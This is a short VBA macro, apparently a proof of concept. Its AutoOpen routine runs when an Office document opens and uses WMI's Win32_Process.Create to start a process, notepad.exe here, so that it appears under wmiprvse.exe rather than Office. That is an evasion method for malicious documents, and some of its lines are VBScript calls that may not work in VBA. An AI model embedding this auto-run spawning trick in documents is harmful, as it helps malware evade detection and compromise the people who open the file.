Sub AutoOpen()
on error resume next
' Using this technique the new process will be spawned under “wmiprvse.exe” instead of the Office process.
set process = GetObject("winmgmts:Win32_Process")

result = process.Create ("notepad.exe",null,null,processid)

WScript.Echo "Method returned result = " & result
WScript.Echo "Id of new process is " & processid

if err <>0 then
 WScript.Echo Err.Description, "0x" & Hex(Err.Number)
end if

End Sub
